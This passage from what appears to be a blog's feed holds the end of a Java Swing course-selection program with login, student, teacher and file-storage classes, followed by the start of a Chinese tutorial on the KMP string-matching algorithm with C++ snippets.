&#123;                            &#125;        &#125;);        menu_cards.add(&quot;teacher_menuBar&quot;,teacher_menuBar);                //manager_cards manager_init_page        teacher_init_page.add(teacher_jl_init);                //manager_cards manager_new_course_page        teacher_score_page.setLayout(new BorderLayout());        teacher_view_course.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Teacher t = (Teacher) user;                reloadScoreTea(t, (int)teacher_jc_course.getSelectedItem());            &#125;        &#125;);        teacher_info_course.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Teacher t = (Teacher) user;                t.getCourseInfo((int)teacher_jc_course.getSelectedItem());                JOptionPane.showMessageDialog(null, &quot;&lt;html&gt;&lt;body&gt;&quot;+&quot;课程编号: &quot;+t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).get(1)                        +&quot;&lt;br&gt;&quot;+&quot;课程名称: &quot;+t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).get(0)                        +&quot;&lt;br&gt;&quot;+&quot;课程信息: &quot;+t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).get(2)+&quot;&lt;body&gt;&lt;/html&gt;&quot;);//t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).toString()            &#125;        &#125;);        teacher_score.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Teacher t = (Teacher) user;                t.scoreStuCourse((int)((List)teacher_score_jl.getSelectedValue()).get(0), (int)((List)teacher_score_jl.getSelectedValue()).get(1), Integer.parseInt(teacher_jt_score.getText()));                reloadScoreTea(t, (int)teacher_jc_course.getSelectedItem());            &#125;        &#125;);        teacher_score_north.setLayout(new BorderLayout());                        teacher_score_north_course.setLayout(new GridLayout(2,2));        teacher_score_north_course.add(teacher_jl_1);        teacher_score_north_course.add(teacher_jc_course);        teacher_score_north_course.add(teacher_view_course);        teacher_score_north_course.add(teacher_info_course);        teacher_score_south.setLayout(new GridLayout(1,0));        teacher_score_south.add(teacher_jt_score);        teacher_score_south.add(teacher_score);                teacher_score_north.add(&quot;North&quot;,teacher_jl_0);        teacher_score_north.add(&quot;Center&quot;,teacher_score_north_course);        teacher_score_page.add(&quot;North&quot;,teacher_score_north);        teacher_score_page.add(&quot;Center&quot;,teacher_score_jsp);        teacher_score_page.add(&quot;South&quot;,teacher_score_south);                        teacher_cards.setLayout(teacher_c_layout);        teacher_cards.add(&quot;teacher_init_page&quot;,teacher_init_page);        teacher_cards.add(&quot;teacher_score_page&quot;,teacher_score_page);        content_cards.add(&quot;teacher_cards&quot;,teacher_cards);       &#125;        private void initStudentPage() &#123;        student_select_course_jl.setCellRenderer(new CourseSelCellRenderer());        student_delect_course_jl.setCellRenderer(new CourseDelCellRenderer());                //student_cards student_menuBar        student_menuBar.add(student_menu_select_course);        student_menuBar.add(student_menu_delect_course);        student_menu_select_course.addMenuListener(new MenuListener() &#123;            @Override            public void menuSelected(MenuEvent e) &#123;                reloadCourseStuNotSelectedList((Student) user);                student_c_layout.show(student_cards, &quot;student_select_course_page&quot;);            &#125;            @Override            public void menuDeselected(MenuEvent e) &#123;                            &#125;            @Override            public void menuCanceled(MenuEvent e) &#123;                            &#125;        &#125;);        student_menu_delect_course.addMenuListener(new MenuListener() &#123;            @Override            public void menuSelected(MenuEvent e) &#123;                reloadScoreStuList((Student) user);                student_c_layout.show(student_cards, &quot;student_delect_course_page&quot;);            &#125;            @Override            public void menuDeselected(MenuEvent e) &#123;                            &#125;            @Override            public void menuCanceled(MenuEvent e) &#123;                            &#125;        &#125;);        student_menu_view_course.addMenuListener(new MenuListener() &#123;            @Override            public void menuSelected(MenuEvent e) &#123;                student_c_layout.show(student_cards, &quot;student_view_course_page&quot;);            &#125;            @Override            public void menuDeselected(MenuEvent e) &#123;                            &#125;            @Override            public void menuCanceled(MenuEvent e) &#123;                            &#125;        &#125;);        menu_cards.add(&quot;student_menuBar&quot;,student_menuBar);                //student_cards student_init_page        student_init_page.add(student_jl_init);                //student_cards student_select_course_page        student_select_course_page.setLayout(new BorderLayout());        student_select_course.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Student s = (Student)user;                HashMap&lt;Integer, List&gt; stu_not_course = s.getCourseStuNotSelected();                s.selStuCourse(((Entry&lt;Integer, List&gt;)student_select_course_jl.getSelectedValue()).getKey());                reloadCourseStuNotSelectedList(s);            &#125;        &#125;);        //student_cards student_delect_course_page        student_delect_course_page.setLayout(new BorderLayout());        student_delect_course.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Student s = (Student)user;                s.delStuCourse((int)((List)student_delect_course_jl.getSelectedValue()).get(1));                reloadScoreStuList(s);            &#125;        &#125;);                student_select_course_page.add(&quot;North&quot;,student_jl_0_0);        student_select_course_page.add(&quot;Center&quot;,student_select_course_jsp);        student_select_course_page.add(&quot;South&quot;,student_select_course);                student_delect_course_page.add(&quot;North&quot;,student_jl_0_1);        student_delect_course_page.add(&quot;Center&quot;,student_delect_course_jsp);        student_delect_course_page.add(&quot;South&quot;,student_delect_course);                student_view_score_page.add(student_jl_0_2);        student_cards.setLayout(student_c_layout);        student_cards.add(&quot;student_init_page&quot;,student_init_page);        student_cards.add(&quot;student_select_course_page&quot;,student_select_course_page);        student_cards.add(&quot;student_delect_course_page&quot;,student_delect_course_page);        content_cards.add(&quot;student_cards&quot;,student_cards);    &#125;    private void initManagerPage() &#123;        manager_jc_teacher.setRenderer(new TeaCellRenderer());                //manager_cards manager_menuBar        manager_menuBar.add(manager_menu);        manager_menu.addMenuListener(new MenuListener() &#123;            @Override            public void menuSelected(MenuEvent e) &#123;                manager_c_layout.show(manager_cards, &quot;manager_new_course_page&quot;);            &#125;            @Override            public void menuDeselected(MenuEvent e) &#123;                            &#125;            @Override            public void menuCanceled(MenuEvent e) &#123;                            &#125;        &#125;);        menu_cards.add(&quot;manager_menuBar&quot;,manager_menuBar);                //manager_cards manager_init_page        manager_init_page.add(manager_jl_init);                //manager_cards manager_new_course_page        manager_new_course_page.setLayout(new GridLayout(0,1));        manager_new_course.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                Entry&lt;Integer,String&gt; t = (Entry&lt;Integer, String&gt;) manager_jc_teacher.getSelectedItem();                Manager m = (Manager)user;                m.newCourse(manager_jt_course_name.getText(), t.getKey(), manager_jt_course_info.getText());                manager_jt_course_name.setText(&quot;&quot;);                manager_jt_course_info.setText(&quot;&quot;);                JOptionPane.showMessageDialog(null, &quot;课程添加成功！&quot;);            &#125;        &#125;);                manager_new_course_page.add(manager_jl_0);        manager_new_course_page.add(manager_jl_1);        manager_new_course_page.add(manager_jt_course_name);        manager_new_course_page.add(manager_jl_2);        manager_new_course_page.add(manager_jc_teacher);        manager_new_course_page.add(manager_jl_3);        manager_new_course_page.add(manager_jt_course_info);        manager_new_course_page.add(manager_new_course);        manager_cards.setLayout(manager_c_layout);        manager_cards.add(&quot;manager_init_page&quot;,manager_init_page);        manager_cards.add(&quot;manager_new_course_page&quot;,manager_new_course_page);        content_cards.add(&quot;manager_cards&quot;,manager_cards);       &#125;    // 设置当前用户，由登录界面调用    public void setUser(User user) &#123;        this.user = user;        if(user.getType()==0) &#123;            setTeacherList();            manager_jl_0.setText(&quot;管理员:&quot;+user.getUsername()+&quot; 编号:&quot;+user.getUserId());            manager_jl_init.setText(&quot;&lt;html&gt;&lt;body&gt;&quot;+&quot;欢迎来到选课系统&lt;br&gt;&quot;+&quot;管理员:&quot;+user.getUsername()+&quot; 编号:&quot;+user.getUserId()+&quot;&lt;br&gt;请选择功能&quot;+&quot;&lt;body&gt;&lt;/html&gt;&quot;);            content_c_layout.show(content_cards, &quot;manager_cards&quot;);            menu_c_layout.show(menu_cards, &quot;manager_menuBar&quot;);            manager_c_layout.show(manager_cards, &quot;manager_init_page&quot;);        &#125;        else if(user.getType()==1) &#123;            setTeacherList_course();            teacher_jl_0.setText(&quot;教师: &quot;+user.getUsername()+&quot;  编号:&quot;+user.getUserId());            teacher_jl_init.setText(&quot;&lt;html&gt;&lt;body&gt;&quot;+&quot;欢迎来到选课系统&lt;br&gt;&quot;+&quot;教师: &quot;+user.getUsername()+&quot;  编号:&quot;+user.getUserId()+&quot;&lt;br&gt;请选择功能&quot;+&quot;&lt;body&gt;&lt;/html&gt;&quot;);            content_c_layout.show(content_cards, &quot;teacher_cards&quot;);            menu_c_layout.show(menu_cards, &quot;teacher_menuBar&quot;);            teacher_c_layout.show(teacher_cards, &quot;teacher_init_page&quot;);        &#125;        else if(user.getType()==2) &#123;            student_jl_0_0.setText(&quot;学生姓名:&quot;+user.getUsername()+&quot;  编号:&quot;+user.getUserId());            student_jl_0_1.setText(&quot;学生姓名:&quot;+user.getUsername()+&quot;  编号:&quot;+user.getUserId());            student_jl_0_2.setText(&quot;学生姓名:&quot;+user.getUsername()+&quot;  编号:&quot;+user.getUserId());            student_jl_init.setText(&quot;&lt;html&gt;&lt;body&gt;&quot;+&quot;欢迎来到选课系统&lt;br&gt;&quot;+&quot;学生: &quot;+user.getUsername()+&quot;    编号: &quot;+user.getUserId()+&quot;&lt;br&gt;请选择功能&quot;+&quot;&lt;body&gt;&lt;/html&gt;&quot;);                        content_c_layout.show(content_cards, &quot;student_cards&quot;);            menu_c_layout.show(menu_cards, &quot;student_menuBar&quot;);            student_c_layout.show(student_cards, &quot;student_init_page&quot;);        &#125;    &#125;        public void setTeacherList() &#123;        manager_jc_teacher.removeAllItems();        HashMap&lt;Integer, String&gt; teacher = db.getTeacher();        for(Entry&lt;Integer, String&gt; entry:teacher.entrySet()) &#123;            manager_jc_teacher.addItem(entry);        &#125;    &#125;        //更新教师界面中选中课程的选课信息    public void reloadScoreTea(Teacher t, int course_id) &#123;        teacher_score_dlm.clear();        ArrayList&lt;List&gt; teacher_course = t.getScoreTeacher(course_id);        for(List l:teacher_course) &#123;            teacher_score_dlm.addElement(l);        &#125;    &#125;        public void setTeacherList_course() &#123;        teacher_jc_course.removeAllItems();        List&lt;Integer&gt; teacher_course = db.getTeacherCourse(user.getUserId());        for(int l:teacher_course) &#123;            teacher_jc_course.addItem(l);        &#125;    &#125;        // 更新学生界面中学生可选课程列表    public void reloadCourseStuNotSelectedList(Student s) &#123;        student_select_course_dlm.clear();            HashMap&lt;Integer, List&gt; course = s.getCourseStuNotSelected();        for(Entry&lt;Integer, List&gt; entry:course.entrySet()) &#123;            student_select_course_dlm.addElement(entry);        &#125;    &#125;        // 更新学生界面中学生已选课程列表    public void reloadScoreStuList(Student s) &#123;        student_delect_course_dlm.clear();        ArrayList&lt;List&gt; student_score = s.getScoreStu();        for(List l:student_score) &#123;            student_delect_course_dlm.addElement(l);        &#125;    &#125;        public void initFrame(LoginFrame login_frame) &#123;        this.login_frame = login_frame;    &#125;        // 清空该用户信息。退出界面时调用    public void clear() &#123;        teacher_score_dlm.clear();        manager_jt_course_name.setText(null);        manager_jt_course_info.setText(null);        teacher_jt_score.setText(null);        user = null;    &#125;&#125;class LoginFrame extends JFrame&#123;    private MainFrame manager_frame;    private JTextField tf_user =  new JTextField();    private JPasswordField tf_pwd = new JPasswordField();    private JButton login = new JButton(&quot;登录&quot;);      // 用户登录    private JLabel jl = new JLabel();    private JLabel jl_login = new JLabel(&quot;&quot;);    private Database db;    private Teach teach;    private User u;    public LoginFrame(Database db, Teach teach) &#123;        super(&quot;选课系统登录&quot;);                setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);        this.db = db;        this.teach = teach;        setLayout(new GridLayout(0,1));        setLocation(800,400);        setSize(250,200);        login.addActionListener(new ActionListener() &#123;            @Override            public void actionPerformed(ActionEvent e) &#123;                User user = verifyUser(tf_user.getText(), String.valueOf(tf_pwd.getPassword()));                if(user==null) &#123;                    jl.setText(&quot;user or pwd error&quot;);                 &#125;                else &#123;                    tf_user.setText(null);                    tf_pwd.setText(null);                    setVisible(false);                    manager_frame.setUser(user);                    manager_frame.setVisible(true);                    jl.setText(null);                &#125;            &#125;                    &#125;);        add(tf_user);        add(tf_pwd);        add(login);        add(jl);    &#125;        public void initFrame(MainFrame manager_frame) &#123;        this.manager_frame = manager_frame;    &#125;    // 验证用户名密码。如果正确，返回用户对象；如果错误，返回null    public User verifyUser(String user, String pwd) &#123;        List account = db.getAccount(user);        u = null;        if(account == null) &#123;            return null;        &#125;        else if(pwd.compareTo((String)account.get(0))==0)&#123;            if((int)account.get(1) == 0) &#123;                u = new Manager(user, pwd, (int)account.get(1),(int)account.get(2),(String)account.get(3), teach);            &#125;            else if((int)account.get(1) == 1) &#123;                u = new Teacher(user, pwd, (int)account.get(1),(int)account.get(2),(String)account.get(3), teach);            &#125;            else if((int)account.get(1) == 2) &#123;                u = new Student(user, pwd, (int)account.get(1),(int)account.get(2),(String)account.get(3), teach);            &#125;            return u;        &#125;        return null;    &#125;&#125;class User&#123;    String user;    // 用户名    String pwd;     // 密码    int type;       // 用户类型    int account_id; // 用户编号    String account_name;    // 用户名字    Teach teach;        public User(String user, String pwd, int type, int account_id, String account_name, Teach teach) &#123;        this.user = user;        this.pwd = pwd;        this.type = type;        this.account_id = account_id;        this.account_name = account_name;        this.teach = teach;    &#125;        public int getType() &#123;        return type;    &#125;        public String getUser() &#123;        return user;    &#125;        public String getUsername() &#123;        return account_name;    &#125;        public int getUserId() &#123;        return account_id;    &#125;&#125;class Student extends User&#123;    public Student(String user, String pwd, int type, int account_id, String account_name, Teach teach) &#123;        super(user, pwd, type, account_id, account_name, teach);    &#125;    // 学生选课。如果成功，返回1，如果失败，返回-1    public int selStuCourse(int course_id) &#123;        teach.selStuCourse(account_id, course_id);        return 1;    &#125;    // 查询学生可选课程。 返回可选课程字典    public HashMap&lt;Integer, List&gt; getCourseStuNotSelected()&#123;        return teach.getCourseStuNotSelected(account_id);    &#125;    // 学生退课。如果成功，返回1，如果失败，返回-1    public int delStuCourse(int course_id) &#123;        teach.delStuCourse(account_id, course_id);        return 1;    &#125;    // 查询学生所选课程信息。 返回所选课程列表    public ArrayList&lt;List&gt; getScoreStu() &#123;        return teach.getScoreStu(account_id);    &#125;&#125;class Teacher extends User&#123;    public Teacher(String user, String pwd, int type, int account_id, String account_name, Teach teach) &#123;        super(user, pwd, type, account_id, account_name, teach);    &#125;    // 查询课程所有学生成绩。 返回成绩列表    public ArrayList&lt;List&gt; getScoreTeacher(int course_id) &#123;        return teach.getScoreTeacher(course_id);    &#125;    // 查询选中课程详细信息。返回课程信息    public List getCourseInfo(int course_id) &#123;        return teach.getCourseInfo(course_id);    &#125;    // 教师对学生课程打分。    public void scoreStuCourse(int student_id, int course_id, int student_score) &#123;        teach.scoreStuCourse(student_id, course_id, student_score);    &#125;&#125;class Manager extends User&#123;    public Manager(String user, String pwd, int type, int account_id, String account_name, Teach teach) &#123;        super(user, pwd, type, account_id, account_name,teach);    &#125;    // 新建课程。如果成功，返回课程编号，如果失败，返回-1    public int newCourse(String course_name, int teacher_id , String course_info) &#123;        teach.newCourse(course_name, teacher_id, course_info);        return 1;    &#125;&#125;class Teach&#123;    private Database db;    public Teach(Database db) &#123;        this.db = db;    &#125;    // 新建课程，进行检查并进行数据库存入。如果成功，返回课程编号，如果失败，返回-1    public int newCourse(String course_name, int teacher_id , String course_info) &#123;        db.addCourse(course_name, teacher_id, course_info);        return 1;    &#125;    // 学生选课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1    public int selStuCourse(int account_id, int course_id) &#123;        db.addStuCourse(account_id, course_id);        return 1;    &#125;    // 学生退课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1    public int delStuCourse(int account_id, int course_id) &#123;        db.delStuCourse(account_id, course_id);        return 1;    &#125;    // 教师对学生课程打分。    public int scoreStuCourse(int student_id, int course_id, int student_score) &#123;        if(student_score&lt;-1 | student_score&gt;100) &#123;            JOptionPane.showMessageDialog(null, &quot;请输入0-100的整数&quot;);            return -1;        &#125;        else &#123;            db.addStuScore(student_id, course_id, student_score);            return 1;        &#125;    &#125;    // 查询课程详细信息。返回课程信息    public List getCourseInfo(int course_id) &#123;        return db.getCourse().get(course_id);    &#125;    // 查询课程所有学生成绩。 返回成绩列表    public ArrayList&lt;List&gt; getScoreTeacher(int course_id) &#123;        return db.getScoreCourse(course_id);    &#125;    // 查询学生可选课程。 返回可选课程字典    public HashMap&lt;Integer, List&gt; getCourseStuNotSelected(int account_id)&#123;        return db.getCourseNotSelected(account_id);    &#125;    // 查询学生所选课程信息。 返回所选课程列表    public ArrayList&lt;List&gt; getScoreStu(int account_id) &#123;        return db.getScoreStu(account_id);    &#125;&#125;class Database &#123;    // 存储文件    private File data_course;    private File data_score;    private File data_account;    // 当前最大编号，用于新增时    private int course_id = 0;    private int student_id = 0;    private int teacher_id = 0;    private int manager_id = 0;    // 运行时数据存储    private HashMap&lt;Integer, List&gt; course = new HashMap&lt;Integer, List&gt;();    private HashMap&lt;String, List&gt; account = new HashMap&lt;String, List&gt;();    private HashMap&lt;Integer, String&gt; manager = new HashMap&lt;Integer, String&gt;();    private HashMap&lt;Integer, String&gt; teacher = new HashMap&lt;Integer, String&gt;();    private HashMap&lt;Integer, String&gt; student = new HashMap&lt;Integer, String&gt;();    private ArrayList&lt;List&gt; score = new ArrayList&lt;List&gt;();        // 参数：存储文件位置    public Database(String file_course, String file_score, String file_account) throws IOException &#123;        this.data_course = new File(file_course);        this.data_score = new File(file_score);        this.data_account = new File(file_account);        this.readIn();    &#125;        public HashMap&lt;Integer, List&gt; getCourse() &#123;        return course;    &#125;        public HashMap&lt;Integer, List&gt; getCourseNotSelected(int student_id) &#123;        HashMap&lt;Integer, List&gt; map_copy = (HashMap&lt;Integer, List&gt;) course.clone();        System.out.println(map_copy.toString());        for(List l: score) &#123;            if((int)l.get(0)==student_id) &#123;                map_copy.remove((int)l.get(1));            &#125;        &#125;        System.out.println(map_copy.toString());        return map_copy;    &#125;    public List getTeacherCourse(int teacher_id) &#123;        List teacher_course_list = new ArrayList();        for(Entry&lt;Integer, List&gt; entry: course.entrySet()) &#123;            if((int)entry.getValue().get(1)==teacher_id) &#123;                teacher_course_list.add((int)entry.getKey());            &#125;        &#125;        return teacher_course_list;    &#125;        public ArrayList&lt;List&gt; getScoreCourse(int course_id) &#123;        ArrayList&lt;List&gt; list_copy = new ArrayList();        for(List l : score) &#123;            if((int)l.get(1)==course_id) &#123;                list_copy.add(l);            &#125;        &#125;        return list_copy;    &#125;        public HashMap&lt;Integer, String&gt; getTeacher() &#123;        return teacher;    &#125;        public HashMap&lt;Integer, String&gt; getStudent() &#123;        return student;    &#125;    public ArrayList&lt;List&gt; getScore(int student_id) &#123;        ArrayList&lt;List&gt; list_copy = new ArrayList();        for(List l : score) &#123;            if((int)l.get(0)==student_id) &#123;                list_copy.add(l);            &#125;        &#125;        return list_copy;    &#125;        public ArrayList&lt;List&gt; getScoreStu(int student_id) &#123;        ArrayList&lt;List&gt; list_copy = new ArrayList();        for(List l : score) &#123;            if((int)l.get(0)==student_id) &#123;                list_copy.add(l);            &#125;        &#125;        return list_copy;    &#125;    public HashMap&lt;String, List&gt; getAccount() &#123;        return account;    &#125;        public List getAccount(String user) &#123;        return account.get(user);    &#125;        //从文件中读入课程、用户名等数据    public void readIn() throws IOException &#123;        RandomAccessFile raf_course = new RandomAccessFile(data_course,&quot;rw&quot;);        RandomAccessFile raf_score = new RandomAccessFile(data_score,&quot;rw&quot;);        RandomAccessFile raf_account = new RandomAccessFile(data_account,&quot;rw&quot;);                long fileLength = raf_course.length();        long filePoint = 0;        int course_id;        String course_name;        int course_teacher_id;        String course_info;        raf_course.seek(0);        if(filePoint &lt; fileLength) &#123;            this.course_id = Integer.parseInt(raf_course.readLine());        &#125;        while(filePoint &lt; fileLength) &#123;            course_id = Integer.parseInt(raf_course.readLine());            course_name = raf_course.readLine();            course_name = new String(course_name.getBytes(&quot;ISO-8859-1&quot;),&quot;gbk&quot;);            course_teacher_id = Integer.parseInt(raf_course.readLine());            course_info = raf_course.readLine();            course_info = new String(course_info.getBytes(&quot;ISO-8859-1&quot;),&quot;gbk&quot;);            course.put(course_id, Arrays.asList(course_name,course_teacher_id,course_info));            filePoint = raf_course.getFilePointer();        &#125;        raf_course.close();                fileLength = raf_account.length();        filePoint = 0;        String account_user;        String account_pwd;        int account_type;        Integer account_id;        String account_name;        raf_account.seek(0);        if(filePoint &lt; fileLength) &#123;            this.manager_id = Integer.parseInt(raf_account.readLine());            this.teacher_id = Integer.parseInt(raf_account.readLine());            this.student_id = Integer.parseInt(raf_account.readLine());            filePoint = raf_account.getFilePointer();        &#125;        while(filePoint &lt; fileLength) &#123;            account_user = raf_account.readLine();            account_user = new String(account_user.getBytes(&quot;ISO-8859-1&quot;),&quot;gbk&quot;);            account_pwd = raf_account.readLine();            account_pwd = new String(account_pwd.getBytes(&quot;ISO-8859-1&quot;),&quot;gbk&quot;);            account_type = Integer.parseInt(raf_account.readLine());            account_id = Integer.parseInt(raf_account.readLine());            account_name = raf_account.readLine();            account_name = new String(account_name.getBytes(&quot;ISO-8859-1&quot;),&quot;gbk&quot;);            switch(account_type) &#123;                case 0:                    manager.put(account_id, account_name);                    break;                case 1:                    teacher.put(account_id, account_name);                    break;                case 2:                    student.put(account_id, account_name);                    break;            &#125;            account.put(account_user, Arrays.asList(account_pwd, account_type, account_id,account_name));            filePoint = raf_account.getFilePointer();        &#125;        raf_account.close();                        fileLength = raf_score.length();        filePoint = 0;        int student_id;        int student_course_id;        int student_score;        raf_score.seek(0);        while(filePoint &lt; fileLength) &#123;            student_id = Integer.parseInt(raf_score.readLine());            student_course_id = Integer.parseInt(raf_score.readLine());            student_score = Integer.parseInt(raf_score.readLine());            score.add(Arrays.asList(student_id,student_course_id,student_score));            filePoint = raf_score.getFilePointer();        &#125;        raf_score.close();    &#125;        //创建用户      public void addAccount(String account_user, String account_pwd, int account_type, String account_name) throws IOException &#123;        int id = -1;        if(!account.containsKey(account_user)) &#123;            switch(account_type) &#123;                case(0):                    manager_id = manager_id+1;                    id = manager_id;                    manager.put(id, account_name);                    break;                case(1):                    teacher_id = teacher_id+1;                    id = teacher_id;                    teacher.put(id, account_name);                    break;                case(2):                    student_id = student_id+1;                    id = student_id;                    student.put(id, account_name);                    break;            &#125;            account.put(account_user, Arrays.asList(account_pwd, account_type, id, account_name));        &#125;else &#123;            System.out.println(&quot;Account &quot;+account_user+&quot; has already exists.&quot;);        &#125;        updateAccountData();    &#125;         public void addCourse(String course_name, int course_teacher_id, String course_info) &#123;        course_id = course_id + 1;        course.put(course_id, Arrays.asList(course_name, course_teacher_id, course_info));    &#125;        public void addStuCourse(int student_id, int course_id) &#123;        score.add(Arrays.asList(student_id, course_id, -1));    &#125;        public void delStuCourse(int student_id, int course_id) &#123;        System.out.println(&quot;del &quot;+student_id+&quot; &quot;+course_id);        Iterator&lt;List&gt; i = score.iterator();        while(i.hasNext())&#123;            List l = i.next();            if((int)l.get(0)==student_id &amp; (int)l.get(1)==course_id)&#123;                i.remove();            &#125;                &#125;    &#125;            public void addStuScore(int student_id, int course_id, int student_score) &#123;        for(List&lt;Integer&gt; l:score) &#123;            if(l.get(0)==student_id &amp; l.get(1)==course_id) &#123;                l.set(2, student_score);                return;            &#125;        &#125;    &#125;            public void clearFile(File file) throws IOException &#123;        FileWriter fileWriter =new FileWriter(file);        fileWriter.write(&quot;&quot;);        fileWriter.flush();        fileWriter.close();    &#125;        private void updateCourseData() throws IOException &#123;        clearFile(data_course);        RandomAccessFile raf_course = new RandomAccessFile(data_course,&quot;rw&quot;);        raf_course.writeBytes(course_id+&quot;\n&quot;);        for(int key:course.keySet()) &#123;            raf_course.write((key+&quot;\n&quot;).getBytes());            raf_course.write((course.get(key).get(0)+&quot;\n&quot;).getBytes());            raf_course.write((course.get(key).get(1)+&quot;\n&quot;).getBytes());            raf_course.write((course.get(key).get(2)+&quot;\n&quot;).getBytes());        &#125;        raf_course.close();    &#125;        private void updateScoreData() throws IOException &#123;        clearFile(data_score);        RandomAccessFile raf_score = new RandomAccessFile(data_score,&quot;rw&quot;);        for(List l:score) &#123;            raf_score.write((l.get(0)+&quot;\n&quot;).getBytes());            raf_score.write((l.get(1)+&quot;\n&quot;).getBytes());            raf_score.write((l.get(2)+&quot;\n&quot;).getBytes());        &#125;        raf_score.close();    &#125;        //更新课程数据    private void updateAccountData() throws IOException &#123;        clearFile(data_account);        RandomAccessFile raf_account = new RandomAccessFile(data_account,&quot;rw&quot;);                raf_account.writeBytes(manager_id+&quot;\n&quot;);        raf_account.writeBytes(teacher_id+&quot;\n&quot;);        raf_account.writeBytes(student_id+&quot;\n&quot;);        for(String key:account.keySet()) &#123;            raf_account.write((key+&quot;\n&quot;).getBytes());            raf_account.write((account.get(key).get(0)+&quot;\n&quot;).getBytes());            raf_account.write((account.get(key).get(1)+&quot;\n&quot;).getBytes());            raf_account.write((account.get(key).get(2)+&quot;\n&quot;).getBytes());            raf_account.write((account.get(key).get(3)+&quot;\n&quot;).getBytes());        &#125;        raf_account.close();    &#125;        // 文件内容更新    public void updataAll() throws IOException &#123;        updateCourseData();        updateScoreData();        updateAccountData();        System.out.println(&quot;update finish&quot;);    &#125;&#125;class ScoreCellRenderer extends DefaultListCellRenderer &#123;    @Override    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) &#123;        super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);        List&lt;Integer&gt; ci = (List&lt;Integer&gt;) value;        this.setText(&quot;学生编号: &quot;+ci.get(0)+&quot;   分数: &quot;+ci.get(2));        return this;    &#125;&#125;class CourseTeaCellRenderer extends DefaultListCellRenderer &#123;    @Override    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) &#123;        super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);        Integer ci = (Integer) value;         this.setText(&quot;课程编号: &quot;+ci);        return this;    &#125;&#125;class CourseSelCellRenderer extends DefaultListCellRenderer &#123;    @Override    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) &#123;        super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);        Entry&lt;Integer, List&gt; ci = (Entry&lt;Integer, List&gt;) value;        this.setText(&quot;课程编号: &quot;+ci.getKey()+&quot;   课程名称: &quot;+ci.getValue().get(0)+&quot;   教师编号: &quot;+ci.getValue().get(1)+&quot;   课程信息: &quot;+ci.getValue().get(2));        return this;    &#125;&#125;class CourseDelCellRenderer extends DefaultListCellRenderer &#123;    @Override    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) &#123;        super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);        List ci = (List) value;        this.setText(&quot;课程编号: &quot;+ci.get(1)+&quot;   分数: &quot;+ci.get(2));        return this;    &#125;&#125;class TeaCellRenderer extends DefaultListCellRenderer &#123;    @Override    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) &#123;        super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);        Entry&lt;Integer, String&gt; ci = (Entry&lt;Integer, String&gt;) value;        this.setText(&quot;编号: &quot;+ci.getKey()+&quot;    姓名: &quot;+ci.getValue());        return this;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2023/04/08/KMP%E7%AE%97%E6%B3%95/"/>
      <url>/2023/04/08/KMP%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="KMP-——-一种字符串匹配算法-学习自董晓算法"><a href="#KMP-——-一种字符串匹配算法-学习自董晓算法" class="headerlink" title="KMP —— 一种字符串匹配算法(学习自董晓算法)"></a>KMP —— 一种字符串匹配算法(学习自董晓算法)</h1><p>给定一个模式串P和一个主串S，求模式串P在主串S中出现的位置。（字符串下标均从1开始）</p><ol><li>去<em>最长的</em>想等前后缀，可以保证不漏解</li><li>通过模式串前后缀的自我匹配长度，计算<em>next函数</em>（降低事件复杂度的关键），给j指针打一张表，失配时跳到next[j]的位置继续匹配。</li></ol><p><em>next函数</em><br>next[i]表示模式串P[1,i]中相等前后缀的最长长度</p><p><img src="https://s2.loli.net/2023/04/09/GrWayKlLNJei2bz.png" alt="image.png"></p><h2 id="next数组代码"><a href="#next数组代码" class="headerlink" title="next数组代码"></a>next数组代码</h2><pre><code class="C++">    ne[1] = 0;    for (int i = 2,j = 0; i &lt;= n; i++) &#123;        while (j &amp;&amp; p[i] != p[j + 1])            j = ne[j];        if (p[i] == p[j + 1])            j++;        ne[i] = j;    &#125;</code></pre><p><em>双指针</em>： i扫描模式串, j扫描前缀。<br>初始化，ne[1]&#x3D;0,i&#x3D;2,j&#x3D;0.(固定的)<br>每轮for循环，i向右走一步。</p><ol><li>若p[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j跳回0.</li><li>若p[i]&#x3D;&#x3D;p[j+1],让j+1，指向匹配前缀的末尾。</li><li>next[i]&#x3D;j.</li><li>j指针所走的总步数就决定乐总的执行次数，每轮for，j至多+1，那么j一共向右至多走n步，往左挑的部署加起来不超过n步，否则j变为负数，故j的总步数不会超过2n。例 a–ab.所以时间复杂度O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/fmOwFJPICvQtaZh.png" alt="image.png"></p><h2 id="模式串与主串匹配代码"><a href="#模式串与主串匹配代码" class="headerlink" title="模式串与主串匹配代码"></a>模式串与主串匹配代码</h2><pre><code class="C++">for(int i = 1, j = 0; i &lt;= m; i++) &#123;        while(j &amp;&amp; S[i] != P[j+1])             j = ne[j];        